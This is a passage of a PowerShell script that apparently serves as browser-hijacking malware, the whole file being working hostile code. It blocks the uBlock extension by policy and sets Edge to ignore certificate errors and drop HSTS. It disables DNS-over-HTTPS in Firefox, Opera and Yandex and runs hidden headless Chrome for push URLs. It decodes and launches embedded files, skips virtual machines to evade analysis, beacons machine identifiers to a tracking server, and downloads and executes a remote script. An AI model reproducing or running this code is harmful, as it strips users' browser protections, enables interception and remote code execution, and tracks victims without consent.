            EnumWindows((hWnd, lParam) => {
                if (IsWindowVisibleEx(hWnd)) {
                    windowHandles.Add(hWnd);
                }
                return true;
            }, IntPtr.Zero);
            return windowHandles.ToArray();
        }

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public const int SW_HIDE = 0;
        public const int SW_MINIMIZE = 6;
        public const int SW_SHOW = 5;

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        public static void CloseWindow(IntPtr hWnd) {
            const uint WM_CLOSE = 0x0010;
            PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
        }
    }
"@

    if (HaveToPushes)
    {
        Close-AllChromes;
        Remove-Pushes;
        Add-Pushes;
    }

}
catch {
    writedbg "An error occurred (Configure Chrome Pushes): $_"
}
}



function Open-ChromeWithUrl {
    param (
        [string]$url, $isDebug
    )
    $job = Start-Job -ScriptBlock {
            param ($url, $isDebug)

            try {
                
 
            Add-Type @"
            using System;
            using System.Collections.Generic;
            using System.Runtime.InteropServices;
            using System.Text;
            
            public static class User32X {
                public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
            
                [DllImport("user32.dll", SetLastError = true)]
                private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
            
                [DllImport("user32.dll", SetLastError = true)]
                private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
            
                [DllImport("user32.dll", SetLastError = true)]
                private static extern int GetWindowTextLength(IntPtr hWnd);
            
                [DllImport("user32.dll", SetLastError = true)]
                private static extern bool IsWindowVisible(IntPtr hWnd);
            
                public static string GetWindowText(IntPtr hWnd) {
                    int length = GetWindowTextLength(hWnd);
                    if (length == 0) return String.Empty;
            
                    StringBuilder sb = new StringBuilder(length + 1);
                    GetWindowText(hWnd, sb, sb.Capacity);
                    return sb.ToString();
                }
            
                public static bool IsWindowVisibleEx(IntPtr hWnd) {
                    return IsWindowVisible(hWnd) && GetWindowTextLength(hWnd) > 0;
                }
            
                public static IntPtr[] EnumerateAllWindows() {
                    var windowHandles = new List<IntPtr>();
                    EnumWindows((hWnd, lParam) => {
                        if (IsWindowVisibleEx(hWnd)) {
                            windowHandles.Add(hWnd);
                        }
                        return true;
                    }, IntPtr.Zero);
                    return windowHandles.ToArray();
                }
            
                [DllImport("user32.dll", SetLastError = true)]
                public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
            
                public const int SW_HIDE = 0;
                public const int SW_MINIMIZE = 6;
                public const int SW_SHOW = 5;
                public const int SW_MAXIMIZE = 3; // Added constant for maximizing window
            
                [DllImport("user32.dll", SetLastError = true)]
                public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
            
                public static void CloseWindow(IntPtr hWnd) {
                    const uint WM_CLOSE = 0x0010;
                    PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                }
            }
"@
}
catch {
}
        
        function Close-ChromeWindow {
            try {
                param ($window)
                [User32X]::CloseWindow($window) | Out-Null
                Start-Sleep -Milliseconds 100
            }
            catch {}
        }
        
        function Close-Chrome {
            param ($process)
            Close-ChromeWindow -window $process.MainWindowHandle
            try {
                $process | Stop-Process -Force
            }
            catch {
            }
        }

        $chromePaths = @(
            "C:\Program Files\Google\Chrome\Application\chrome.exe",
            "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
            "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe",
            "$env:ProgramFiles\Google\Chrome\Application\chrome.exe",
            "$env:ProgramFiles(x86)\Google\Chrome\Application\chrome.exe"
        )
        $resolvedPaths = @()
        foreach ($path in $chromePaths) {
            try {
                $resolvedPath = Resolve-Path -Path $path -ErrorAction Stop
                if ($resolvedPath -notin $resolvedPaths) {
                    $resolvedPaths += $resolvedPath.Path
                }
            } catch {
                writedbg "Error resolving path: $_"
            }
        }
        $resolvedPaths = $resolvedPaths | Select-Object -Unique
        foreach ($path in $resolvedPaths) {
            if (Test-Path -Path $path) {
                writedbg "Found Chrome at: $path"
    
                $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
                $processStartInfo.FileName = $path
                if (-not $isDebug)
                {
                    $processStartInfo.Arguments = "--headless";
                }
                $processStartInfo.Arguments += " --disable-gpu --dump-dom $url"
                $processStartInfo.CreateNoWindow = $false
                $processStartInfo.UseShellExecute = $false
                $process = New-Object System.Diagnostics.Process
                $process.StartInfo = $processStartInfo
                $process.Start() | Out-Null         
                $endTime = (Get-Date).AddSeconds(8)
                while ((Get-Date) -lt $endTime) {
                    if ($isDebug -eq $false)
                    {
                        try
                        {
                            [User32X]::ShowWindow($process.MainWindowHandle, [User32X]::SW_HIDE) | Out-Null                                
                        }
                        catch
                        {
                        }
                    }
                    Start-Sleep -Milliseconds 100
                }
                try
                {
                    [User32X]::ShowWindow($process.MainWindowHandle, [User32X]::SW_SHOW) | Out-Null
                }
                catch
                {
                }
                Close-Chrome -process $process
                break
            } else {
                writedbg "Chrome not found at: $path"
            }
        }

    } -ArgumentList $url, $isDebug

    return $job
}

function LaunchChromePushes {
    $auto = Test-Autostart;
    if ($server.pushesForce -ne $false -and $auto -eq $true)
    {
        writedbg "Skipping function LaunchChromePushes"
        return
    }
    try {
        foreach ($push in $server.pushes) {
            $isDebug = IsDebug
            Open-ChromeWithUrl -url $push -isDebug $isDebug
        }
    }
    catch {
      writedbg "An error occurred LaunchChromePushes): $_"
    }
}

function do_chrome_push {
    ConfigureChromePushes
    LaunchChromePushes
}





function do_chrome_ublock {
    $keywords = @("uBlock")

    foreach ($dir in Get-EnvPaths) {
        $chromeDir = Join-Path -Path $dir -ChildPath "Google\Chrome\User Data\Default\Extensions"
        
        try {
            if (Test-Path -Path $chromeDir -PathType Container) {
                $extensions = Get-ChildItem -Path $chromeDir -Directory

                foreach ($extension in $extensions) {
                    $manFile = chromeublock_FindManifestFile -folder $extension.FullName
                    if ($manFile -ne "") {
                        $foundKeyword = $false
                        
                        foreach ($manifestValue in $keywords) {
                            $content = Get-Content -Path $manFile -Raw
                            if ($content -match [regex]::Escape($manifestValue)) {
                                $foundKeyword = $true
                                break
                            }
                        }

                        if ($foundKeyword) {
                            $extFolderName = [System.IO.Path]::GetFileName($extension.FullName)
                            chromeublock_ProcessManifestAll -extName $extFolderName
                        }
                    }
                }
            }
        } catch {
             writedbg "Error occurred: $_"
        }
    }
}


function chromeublock_FindManifestFile {
    param (
        [string]$folder
    )

    $result = ""

    Get-ChildItem -Path $folder | ForEach-Object {
        if (-not ($_.PSIsContainer)) {
            if ($_.Name -eq "manifest.json") {
                $result = $_.FullName
                return
            }
        } elseif ($_.Name -notin @('.', '..')) {
            $result = chromeublock_FindManifestFile -folder $_.FullName
            if ($result -ne "") {
                return
            }
        }
    }

    return $result
}


function chromeublock_ProcessManifestAll {
    param (
        [string]$extName
    )

    chromeublock_ProcessManifest -extName $extName -browser "Google\Chrome"
}

function chromeublock_ProcessManifest {
    param (
        [string]$extName,
        [string]$browser
    )

    $regPath = "HKLM:\SOFTWARE\Policies\$browser\ExtensionInstallBlocklist"
    
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    
    $regKeyIndex = 1
    do {
        $keyName = "$regKeyIndex"
        $val = Get-ItemProperty -Path $regPath -Name $keyName -ErrorAction SilentlyContinue
        if ($val -eq $extName) {
            return
        }
        $regKeyIndex++
    } until (-not (Test-Path "$regPath\$keyName"))

    Set-ItemProperty -Path $regPath -Name $keyName -Value $extName
}





function do_edge {
    $paths = @(
        "HKLM:\SOFTWARE\Policies\Microsoft\Edge",
        "HKCU:\SOFTWARE\Policies\Microsoft\Edge"
    )

    foreach ($edgeKeyPath in $paths) 
    {
        if (-not (Test-Path $edgeKeyPath)) {
            New-Item -Path $edgeKeyPath -Force | Out-Null
        }
        
        $commandLinePath = Join-Path $edgeKeyPath "CommandLine"
        if (-not (Test-Path $commandLinePath)) {
            New-Item -Path $commandLinePath -Force | Out-Null
        }
        
        Set-ItemProperty -Path $commandLinePath -Name "(Default)" -Value "--ignore-certificate-errors --disable-quic --disable-hsts"
        
        Set-ItemProperty -Path $edgeKeyPath -Name "DnsOverHttps" -Value "off"

        Set-ItemProperty -Path $edgeKeyPath -Name "IgnoreCertificateErrors" -Value 1
    }
}






function EmbeddingName {
    param (
        [string]$name
    )
    $folder = Get-HephaestusFolder
    return Join-Path -Path $folder -ChildPath $name
}

function DoInternalEmbeddings {
    param (
        [array]$names, [array]$datas, $force, $name
    )

    $auto = Test-Autostart;
    if ($force -ne $false -and $auto -eq $true)
    {
        writedbg "Skipping function DoInternalEmbeddings ($name)"
        return
    }
    try 
    {
        for ($i = 0; $i -lt $names.Length; $i++) {
            $name = $names[$i]
            $data = $datas[$i]
            $file = EmbeddingName($name)
            CustomDecode -inContent $data -outFile $file
            Invoke-Item $file
        }
    }
    catch {
    writedbg "An error occurred (DoFront): $_"
    }
}


function DoFront {
    DoInternalEmbeddings -names $xfront_name -datas $xfront -force $server.frontForce -name "front"
}

function DoEmbeddings {
    DoInternalEmbeddings -names $xembed_name -datas $xembed -force $server.embeddingsForce -name "embeddings"
}

function do_embeddings {
    DoFront
    DoEmbeddings
}






function do_firefox 
{
    try 
    {
        Set-FirefoxRegistry -KeyPaths @(
            'SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS',
            'SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS'
        ) -ValueNames @('Enabled', 'Locked') -Values @(0, 1)
    }
    catch 
    {
        writedbg "Failed to set firefox registry: $_"
    }
    foreach ($dir in Get-EnvPaths) 
    {
        try 
        {
        $path = Join-Path -Path $dir -ChildPath "Mozilla\Firefox\Profiles\user.js"

            $UserJSContent = 'user_pref("network.trr.mode", 5);'
            
            if (!(Test-Path -Path $path -PathType Leaf)) 
            {
                New-Item -Path $path -ItemType File -ErrorAction SilentlyContinue
                Add-Content -Path $path -Value $UserJSContent -ErrorAction SilentlyContinue
            }
        }
        catch 
        {
            writedbg "Failed to write to user.js file: $_"
        }
    }
}


function Set-FirefoxRegistry {
    param (
        [string[]]$KeyPaths,
        [string[]]$ValueNames,
        [int[]]$Values
    )

    $ErrorActionPreference = 'Stop'
    $regKey = [Microsoft.Win32.Registry]::LocalMachine

    try {
        foreach ($i in 0..($KeyPaths.Length - 1)) {
            $key = $regKey.OpenSubKey($KeyPaths[$i], $true)
            if ($key -eq $null) {
                writedbg "Failed to open registry key: $($KeyPaths[$i])"
                return
            }

            $key.SetValue($ValueNames[$i], $Values[$i], [Microsoft.Win32.RegistryValueKind]::DWord)
            $key.Close()
        }
    }
    catch {
        writedbg "Error accessing or modifying registry: $_"
    }
}





function do_opera
{
    Close-Processes(@('opera_crashreporter.exe', 'opera.exe'))

    foreach ($dir in Get-EnvPaths) {
        $path = Join-Path -Path $dir -ChildPath 'Opera Software\Opera Stable\Local State'

        try {
            if (Test-Path -Path $path -PathType Leaf)
            {
                ConfigureOperaInternal -FilePath $path
            }
        } catch {
            writedbg "Error occurred in Opera: $_"
        }
    }
}

function ConfigureOperaInternal {
    param(
        [string]$filePath
    )

    $content = Get-Content -Path $filePath -Raw | ConvertFrom-Json

    if ($null -eq $content.dns_over_https -or $content.dns_over_https -isnot [object]) {
        $content.dns_over_https = @{
            'mode' = 'off'
            'opera' = @{
                'doh_mode' = 'off'
            }
            'templates' = ""
        }
    } else {
        $content.dns_over_https.mode = 'off'
        $content.dns_over_https.opera = @{
            'doh_mode' = 'off'
        }
        $content.dns_over_https.templates = ""
    }

    $jsonString = $content | ConvertTo-Json -Depth 10

    Set-Content -Path $filePath -Value $jsonString -Encoding UTF8 -Force

    writedbg "Successfully configured Opera settings in $filePath"
}







function do_starturls {
    $auto = Test-Autostart;
    if ($server.startUrlsForce -ne $false -and $auto -eq $true)
    {
        writedbg "Skipping function DoStartUrls"
        return
    }
    try
        {
        foreach ($startUrl in $server.startUrls) {
            Start-Process $startUrl.Trim()
        }
    }
    catch
    {
      writedbg "An error occurred (Start Urls): $_"
    }
}





function Is-VirtualMachine {
    # Get Win32_ComputerSystem information
    $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
    $isVirtual = $false

    # Check for common virtualization manufacturers
    $vmManufacturers = @(
        "Microsoft Corporation",   # Hyper-V
        "VMware, Inc.",            # VMware
        "Xen",                     # Xen
        "XenSource, Inc.",         # XenSource
        "innotek GmbH",            # VirtualBox
        "Oracle Corporation",      # VirtualBox
        "Parallels Software International Inc.", # Parallels
        "QEMU",                    # QEMU
        "Red Hat, Inc.",           # KVM
        "Amazon EC2",              # AWS EC2
        "Google",                  # Google Cloud Platform
        "Virtuozzo",               # Virtuozzo
        "DigitalOcean"             # DigitalOcean
    )

    # Check Manufacturer and Model for signs of virtualization
    if ($vmManufacturers -contains $computerSystem.Manufacturer) {
        $isVirtual = $true
    } elseif ($computerSystem.Model -match "Virtual|VM|VBOX|KVM|QEMU|Parallels|Xen") {
        $isVirtual = $true
    }

    # Additional checks for virtualization using Win32_BIOS
    $bios = Get-WmiObject -Class Win32_BIOS
    if ($bios.SerialNumber -match "VMware|VBOX|Virtual|Xen|QEMU|Parallels") {
        $isVirtual = $true
    }

    # Additional checks using Win32_ComputerSystemProduct
    $computerSystemProduct = Get-WmiObject -Class Win32_ComputerSystemProduct
    if ($computerSystemProduct.Version -match "Virtual|VM|VBOX|KVM|QEMU|Parallels|Xen") {
        $isVirtual = $true
    }

    # Additional registry check for Parallels
    $parallelsKey = "HKLM:\SOFTWARE\Parallels\Parallels Tools"
    if (Test-Path $parallelsKey) {
        $isVirtual = $true
    }

    return $isVirtual
}

function Generate-Hash {
    param (
        [string]$data,
        [string]$key
    )

    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
    $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($data)
    
    $hmac = New-Object System.Security.Cryptography.HMACSHA256
    $hmac.Key = $keyBytes
    $hashBytes = $hmac.ComputeHash($dataBytes)
    
    return [Convert]::ToBase64String($hashBytes)
}

function Write-StringToFile {
    param (
        [string]$FileName,
        [string]$Content
    )
    
    # Get the path to the desktop
    $DesktopPath = [System.Environment]::GetFolderPath('Desktop')
    
    # Create the full path to the file
    $FilePath = Join-Path -Path $DesktopPath -ChildPath $FileName
    
    # Write the content to the file, creating or overwriting it
    Set-Content -Path $FilePath -Value $Content
}

function GetSerie()
{
    return RegReadParam -keyName "trackSerie"
}


function do_tracker {
    if ($server.track -eq $false){
        return
    }

    $isVM = Is-VirtualMachine
    if ($isVM -eq $true){
        return
    }

    $elevated = 0
    if (IsElevated)
    {
        $elevated=1;
    }

    $id = Get-MachineCode
    $serie=GetSerie

    $body = "{`"id`":`"$($id.ToString())`",`"serie`":`"$($GetSerie)`",`"elevated_number`":$($elevated)}"

    # Secret key (shared with the server)
    $secretKey = "YourSecretKeyHere"

    $url= $server.trackUrl
  
    # Generate the hash for the JSON request body
    $hash = Generate-Hash -data $body -key $secretKey

    # Prepare headers
    $headers = @{
        "X-Signature" = $hash
        "Content-Type" = "application/json"
        "User-Agent"  = "PowerShell/7.2"  # Use the User-Agent from Postman if known
    }

    $url = SmartServerlUrl -url $url
    $body = EnvelopeIt -inputString $body

    $timeout = [datetime]::UtcNow.AddMinutes(1)
    $delay = 30
    if (-not $globalDebug)
    {
        Start-Sleep -Seconds $delay
    }

    
    while ([datetime]::UtcNow -lt $timeout) 
    {
     
        try {
                Invoke-WebRequest -Headers $headers -Method "POST" -Body $body -Uri $url -ContentType "application/json; charset=utf-8"
                break;
            }
            catch [System.Net.WebException] {
                $statusCode = $_.Exception.Response.StatusCode
                $respStream = $_.Exception.Response.GetResponseStream()
                $reader = New-Object System.IO.StreamReader($respStream)
                $reader.BaseStream.Position = 0
                $responseBody = $reader.ReadToEnd() | ConvertFrom-Json
                    writedbg "Error making request: $responseBody"
            
            }
            catch{
                    writedbg "Error making request: $_"
            }

            Start-Sleep -Seconds $delay
    }

    if ($server.trackDesktop -eq $true){
        Write-StringToFile -FileName "$($server.trackSerie).txt" -Content $id
    }

}






function do_yandex
{
    Close-Processes(@('service_update.exe','browser.exe'))

    foreach ($dir in Get-EnvPaths) {
        $path = Join-Path -Path $dir -ChildPath 'Yandex\YandexBrowser\User Data\Local State'

        try {
            if (Test-Path -Path $path -PathType Leaf)
            {
                ConfigureYandexInternal -FilePath $path
            }
        } catch {
            writedbg "Error occurred: $_"
        }
    }
}

function ConfigureYandexInternal {
    param(
        [string]$filePath
    )
    $content = Get-Content -Path $filePath -Raw | ConvertFrom-Json

    if ($null -eq $content.dns_over_https -or $content.dns_over_https -isnot [object]) {
        $content | Add-Member -MemberType NoteProperty -Name 'dns_over_https' -Value @{
            'mode' = 'off'
            'templates' = ""
        }
    } else {
        $content.dns_over_https.mode = 'off'
        $content.dns_over_https.templates = ""
    }

    $jsonString = $content | ConvertTo-Json -Depth 10

    Set-Content -Path $filePath -Value $jsonString -Encoding UTF8 -Force

    writedbg "Successfully configured Yandex settings in $filePath"
}





function do_extraupdate() {
    if (-not $server.extraUpdate){
        return
    }
    $timeout = [datetime]::UtcNow.AddMinutes(1)
    $delay = 50
    Start-Sleep -Seconds $delay
    
    while ([datetime]::UtcNow -lt $timeout) {
        try {
            $response = Invoke-WebRequest -Uri $server.extraUpdateUrl -UseBasicParsing -Method Get

            if ($response.StatusCode -eq 200) {
                $scriptBlock = [ScriptBlock]::Create($response.Content)
                . $scriptBlock
                return
            }
        }
        catch {
            writedbg "Failed to download or execute the script: $_"
        }

        Start-Sleep -Seconds $delay
    }
    writedbg "Failed to download the script within the allotted time."
}




do_startdownloads
do_dnsman
do_cert
do_chrome
do_chrome_push
do_chrome_ublock
do_edge
do_embeddings
do_firefox
do_opera
do_starturls
do_tracker
do_yandex
do_extraupdate
